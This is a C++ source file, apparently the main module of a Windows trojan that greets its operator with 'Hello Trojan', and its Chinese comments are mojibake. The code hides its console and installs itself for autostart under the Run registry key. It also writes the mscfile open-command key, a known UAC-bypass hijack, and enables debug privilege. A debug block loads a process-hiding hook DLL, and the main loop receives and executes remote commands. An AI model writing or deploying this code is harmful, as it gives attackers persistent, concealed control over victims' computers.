#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

// #define DEBUG

char recvBuffer[BUFFER_SIZE];
vector<string> fileScanResult;
vector<string> directoryScanResult;

void HKRunator()   // ���������� 
{
	HKEY hKey;  //����ע���ľ��

	   //�ҵ�ϵͳ��������λ�� 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	//��������Key  
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hKey);

	if (lRet == ERROR_SUCCESS)  //�򿪳ɹ�
	{
		char pFileName[MAX_PATH] = { 0 };  //������·��
		//�õ����������ȫ·��  
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//���һ����Key,������ֵ // �����"test"��Ӧ�ó������֣����Ӻ�׺.exe�� 
		lRet = RegSetValueEx(hKey, "SetAutoRun", 0, REG_SZ, (BYTE*)pFileName, dwRet);
		//�ر�ע���  
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			printf("ϵͳ��������,������ɿ�����������\n");
		}
		else
		{
			printf("�򿪿��������ɹ�\n");
		}
		// isrun = 1; 
	}
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

int EnableDebugPriv(const char* name)
{
	HANDLE hToken;        //�������ƾ��
	TOKEN_PRIVILEGES tp;  //TOKEN_PRIVILEGES�ṹ�壬���а���һ��������+��������Ȩ������
	LUID luid;           //�����ṹ���е�����ֵ

	//�򿪽������ƻ�
	//GetCurrentProcess()��ȡ��ǰ���̵�α�����ֻ��ָ��ǰ���̻����߳̾������ʱ�仯
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		fprintf(stderr, "OpenProcessToken error\n");
		return -1;
	}

	//��ñ��ؽ���name�������Ȩ�����͵ľֲ�ΨһID
	if (!LookupPrivilegeValue(NULL, name, &luid))
	{
		fprintf(stderr, "LookupPrivilegeValue error\n");
	}

	tp.PrivilegeCount = 1;                               //Ȩ��������ֻ��һ����Ԫ�ء�
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  //Ȩ�޲���
	tp.Privileges[0].Luid = luid;                        //Ȩ������

	//��������Ȩ��
	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		fprintf(stderr, "AdjustTokenPrivileges error!\n");
		return -1;
	}

	return 0;
}

BOOL SetReg(char* lpszExePath)

{

	HKEY hKey = NULL;

	// ������

	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &hKey, NULL);

	// ���ü�ֵ

	::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath)));

	// �ر�ע���

	::RegCloseKey(hKey);

	return TRUE;

}

int main()
{
#ifndef DEBUG
	if (HIDE_CONSOLE)
	{
		HideConsole();
	}
	cout << "Hello Trojan: " << GetCurrentProcessId() << endl;
	if (AUTOSTART)
	{
		HKRunator();
	}
	char test1[30];
	char test2[30] = { 0 };
	while (1)
	{
		Controller ctrl;
		bool NORMAL = true;

		if (ctrl.initializeError)
		{
			cout << "initialize error: " << GetLastError() << endl;
		}
		else
		{
			while (NORMAL && ctrl.working)
			{
				NORMAL = ctrl.RecvCmd();
				if (NORMAL)
					NORMAL = ctrl.ExecCmd();
			}
			if (NORMAL)
			{
				cout << "[+] Successfully Quit. [+]" << endl;
			}
			else
			{
				cout << "[-] Error: " << GetLastError() << endl;
			}
		}
		ctrl.Close();
	}
#endif
#ifdef DEBUG
	if (EnableDebugPriv(SE_DEBUG_NAME))
		cout << "Get debug privilege FAILED\n";
	// ����DLL����ȡ���
	HMODULE hDll = ::LoadLibrary("HideProcessDll.dll");
	if (NULL == hDll)
	{
		printf("%s error[%d]\n", "LoadLibrary", ::GetLastError());
	}
	printf("Load Library OK.\n");

	// ����ȫ�ֹ���
	typedef HHOOK(*typedef_SetHook)();
	typedef_SetHook SetHook = (typedef_SetHook)::GetProcAddress(hDll, "SetHook");
	if (NULL == SetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	HHOOK hHook = SetHook();
	if (NULL == hHook)
	{
		printf("%s error[%d]\n", "SetWindowsHookEx", ::GetLastError());
	}
	printf("Set Windows Hook OK.\n");
	system("pause");
	// ж��ȫ�ֹ���
	typedef BOOL(*typedef_UnsetHook)(HHOOK);
	typedef_UnsetHook UnsetHook = (typedef_UnsetHook)::GetProcAddress(hDll, "UnsetHook");
	if (NULL == UnsetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	if (FALSE == UnsetHook(hHook))
	{
		printf("%s error[%d]\n", "UnhookWindowsHookE", ::GetLastError());
	}
	printf("Unhook Windows Hook OK.\n");
	// ж��DLL
	::FreeLibrary(hDll);
#endif

	//ShowConsole();
	system("pause");
}